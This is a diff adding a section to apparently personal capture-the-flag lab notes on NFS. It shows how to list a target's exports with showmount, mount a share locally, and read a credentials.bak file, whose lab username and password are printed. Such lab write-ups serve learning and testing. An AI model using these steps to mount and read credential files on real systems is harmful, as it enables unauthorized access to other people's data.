@@ -118,3 +118,52 @@ You can connect to a telnet server with the following syntax:
 
 We're going to need to keep this in mind as we try and exploit this machine.
 
+NFS --- Net File sharing  Protocol or servevr :
+
+Basic keyword :
+
+                        mount >>> Mounting a filesystem simply means making the particular filesystem accessible at a certain point in the Linux directory tree. When mounting a filesystem it does not matter if the filesystem is a hard disk partition, CD-ROM, floppy, or USB storage device. You simply need to know the device name associated with the particular storage device and a directory you would like to mount it to. 
+
+
+
+Command :
+                   man showmount ----------------------------------- show mount information for an NFS server
+
+
+
+Uses :
+
+Checking mount file on target machine
+
+
+          showmount -e ip
+ 
+          showmount -e 10.10.71.180
+
+Then , attach mount file  in your local pc using mount command like that :
+
+
+          sudo mount ip:/mount_file_path your_local_file_path
+
+          sudo mount 10.10.71.180:/var/nfs/general /mnt
+
+Check mount file on your local device :
+
+         ls -la /mnt
+                                                                          
+total 12
+drwxr-xr-x  2 nobody nogroup 4096 Nov 21 10:24 .
+drwxr-xr-x 19 root   root    4096 Mar 20 23:41 ..
+-rw-r--r--  1 root   root      31 Nov 21 10:24 credentials.bak
+
+
+Read mount file :
+
+        sudo cat /mnt/credential.bak
+
+paradoxial.test
+ShibaPretzel79
+
+
+Ok  , You did  well  (-_-)
+
